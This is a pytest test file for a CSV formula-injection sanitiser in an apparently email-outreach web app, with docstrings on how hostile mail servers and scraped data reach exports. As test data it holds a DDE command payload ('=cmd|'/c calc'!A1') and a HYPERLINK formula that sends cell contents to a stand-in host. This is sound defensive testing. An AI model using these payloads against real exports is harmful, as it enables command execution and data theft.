"""A CSV cell is executable code, and the untrusted text isn't the operator's.

``=cmd|'/c calc'!A1`` in a downloaded export is a command the operator's machine
runs when they double-click the file. Nothing in this application fails when it
happens — the payload is stored, served and opened exactly as designed — so the
only signal is on a laptop, after the fact.

``routers.import_export`` defused its two exports with a private ``_csv_safe``.
The send-history export in ``routers.email_templates`` did not, and it is the
worse of the three, because its untrusted columns are not ones an operator would
recognise as input:

* ``to_email`` — an address the scraper harvested from a third-party website.
* ``subject`` — carried through from inbound mail on a reply thread.
* ``error`` — **the rejection string the receiving mail server chose**. A
  hostile MX answering ``550 =HYPERLINK("http://x/"&A1,"Click")`` has it stored
  verbatim by the bounce path and written into the operator's spreadsheet.

The shared helper is ``app.csv_export.csv_safe``; these tests assert on the
endpoints rather than the helper, because "there is a sanitiser in the codebase"
was already true while the export was vulnerable.
"""

import csv
import io
import uuid
from datetime import datetime, timezone

import pytest
from sqlalchemy.ext.asyncio import AsyncSession

from app.csv_export import CSV_FORMULA_PREFIXES, csv_safe
from app.models.company import Company
from app.models.contact import Contact
from app.models.email_template import EmailSend
from app.org_context import APPREND_ORG_ID

# One payload per prefix a spreadsheet acts on, plus the leading-space variant
# that a first-character test cannot see.
PAYLOADS = [
    '=cmd|\'/c calc\'!A1',
    '+1+1',
    '-1+1',
    '@SUM(1+1)',
    ' =1+1',
    '\t=1+1',
]


def _cells(body: str) -> list[str]:
    """Every cell of a parsed CSV body, header row included."""
    return [c for row in csv.reader(io.StringIO(body)) for c in row]


def _assert_no_live_formulas(body: str) -> None:
    """No cell in this export opens a formula when a spreadsheet reads it."""
    offenders = [
        c for c in _cells(body)
        if c.lstrip() and c.lstrip()[0] in CSV_FORMULA_PREFIXES
    ]
    assert offenders == [], f"cells a spreadsheet would evaluate: {offenders!r}"


# ---------------------------------------------------------------------------
# The helper
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("payload", PAYLOADS)
def test_every_formula_prefix_is_defused(payload):
    out = csv_safe(payload)
    assert out.startswith("'")
    # The original text is preserved — this is a display-time escape, not a
    # scrub. An operator reading the export still sees what the server said.
    assert out[1:] == payload


def test_a_leading_space_still_evaluates_so_it_is_still_quoted():
    """Sheets and LibreOffice trim before deciding, so ``" =1+1"`` is a formula.

    A first-character check — the shape the original helper had — passes this
    string straight through, and it is the easiest variant for an attacker to
    reach for once the obvious one is blocked.
    """
    assert csv_safe(" =1+1") == "' =1+1"


def test_ordinary_text_is_untouched():
    for value in ("Acme Stamping Co.", "sent", "", "a@b.com", "550 Mailbox full"):
        assert csv_safe(value) == value


def test_none_becomes_empty_not_the_string_none():
    assert csv_safe(None) == ""


def test_a_negative_number_is_quoted_and_that_is_the_right_trade():
    """``-5`` is a formula prefix, so it gets quoted. Deliberate.

    Numeric columns in these exports are counts and ids, which are never
    negative; the cost of quoting a hypothetical negative is a cell that reads
    as text, against a cell that runs. Pinned so nobody "fixes" ``-`` out of the
    prefix list — it is the one that makes ``-2+3+cmd|…`` work.
    """
    assert csv_safe("-5") == "'-5"


# ---------------------------------------------------------------------------
# The endpoint that was vulnerable
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_send_history_export_defuses_a_hostile_smtp_rejection(
    client, db_session: AsyncSession
):
    """The ``error`` column is whatever the remote mail server said.

    This is the column that makes the export a real vector rather than a
    theoretical one: it is the only free text in the product written by a party
    with no relationship to us, and the bounce path stores it verbatim.
    """
    db_session.add(EmailSend(
        id=uuid.uuid4(),
        org_id=APPREND_ORG_ID,
        to_email="prospect@example.com",
        subject="Quick question",
        status="bounced",
        sent_at=datetime.now(timezone.utc),
        error='550 =HYPERLINK("http://evil.test/"&A1,"Click to fix delivery")',
    ))
    await db_session.commit()

    resp = await client.get("/api/v1/email-sends/export-csv")
    assert resp.status_code == 200

    body = resp.text
    _assert_no_live_formulas(body)
    # The text survives — quoted, not dropped. An operator investigating a
    # bounce needs to read what the server actually returned.
    assert "HYPERLINK" in body


@pytest.mark.asyncio
async def test_send_history_export_defuses_a_scraped_address_and_subject(
    client, db_session: AsyncSession
):
    """``to_email`` comes off a third-party site; ``subject`` off inbound mail."""
    db_session.add(EmailSend(
        id=uuid.uuid4(),
        org_id=APPREND_ORG_ID,
        to_email='=1+1@example.com',
        subject='@SUM(1+1)',
        status="sent",
        sent_at=datetime.now(timezone.utc),
    ))
    await db_session.commit()

    resp = await client.get("/api/v1/email-sends/export-csv")
    assert resp.status_code == 200
    _assert_no_live_formulas(resp.text)


@pytest.mark.asyncio
async def test_send_history_export_still_round_trips_ordinary_rows(
    client, db_session: AsyncSession
):
    """The escape must not corrupt the common case.

    A sanitiser that mangles every export is one somebody turns off.
    """
    db_session.add(EmailSend(
        id=uuid.uuid4(),
        org_id=APPREND_ORG_ID,
        to_email="prospect@acme.com",
        subject="Quick question about your stamping line",
        status="sent",
        sent_at=datetime.now(timezone.utc),
    ))
    await db_session.commit()

    rows = list(csv.DictReader(io.StringIO(
        (await client.get("/api/v1/email-sends/export-csv")).text
    )))
    assert len(rows) == 1
    assert rows[0]["to_email"] == "prospect@acme.com"
    assert rows[0]["subject"] == "Quick question about your stamping line"
    assert rows[0]["status"] == "sent"


# ---------------------------------------------------------------------------
# The two exports that were already defused — pinned so they stay that way
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_company_export_defuses_a_scraped_name(client, db_session: AsyncSession):
    db_session.add(Company(
        id=uuid.uuid4(),
        org_id=APPREND_ORG_ID,
        name='=cmd|\'/c calc\'!A1',
        domain="evil.test",
        country="US",
        source="scraper",
    ))
    await db_session.commit()

    resp = await client.get("/api/v1/import-export/export/companies/csv")
    assert resp.status_code == 200
    _assert_no_live_formulas(resp.text)


@pytest.mark.asyncio
async def test_contact_export_defuses_a_scraped_name(client, db_session: AsyncSession):
    company = Company(
        id=uuid.uuid4(), org_id=APPREND_ORG_ID, name="Acme",
        domain="acme.test", country="US", source="scraper",
    )
    db_session.add(company)
    await db_session.flush()
    db_session.add(Contact(
        id=uuid.uuid4(),
        org_id=APPREND_ORG_ID,
        company_id=company.id,
        first_name='@SUM(1+1)',
        last_name="Smith",
        email="s@acme.test",
        source="scraper",
    ))
    await db_session.commit()

    resp = await client.get("/api/v1/import-export/export/contacts/csv")
    assert resp.status_code == 200
    _assert_no_live_formulas(resp.text)
